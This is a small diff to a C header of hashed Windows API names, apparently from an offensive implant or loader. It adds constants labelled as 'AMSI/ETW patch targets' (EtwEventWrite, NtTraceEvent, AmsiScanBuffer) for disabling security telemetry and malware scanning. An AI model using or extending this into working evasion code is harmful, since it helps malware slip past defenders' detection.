@@ -57,6 +57,12 @@
 #define H_NTTERMINATEPROCESS       0xB931F2E7u  /* NtTerminateProcess */
 #define H_NTSETINFORMATIONPROCESS  0x81BADCAAu  /* NtSetInformationProcess */
 
+/* P3 - AMSI/ETW patch targets */
+#define H_ETWEVENTWRITE             0xE8F06CDEu  /* ntdll!EtwEventWrite   */
+#define H_NTTRACEEVENT              0xF15FAD34u  /* ntdll!NtTraceEvent    */
+#define H_AMSISCANBUFFER            0xCEC9C644u  /* amsi.dll!AmsiScanBuffer */
+#define H_AMSI_DLL                  0xAF35FE21u  /* amsi.dll                */
+
 /* kernel32.dll exports */
 #define H_GETCURRENTPROCESSID  0xC36D7CE0u
 #define H_GETCURRENTTHREADID   0xF388A295u
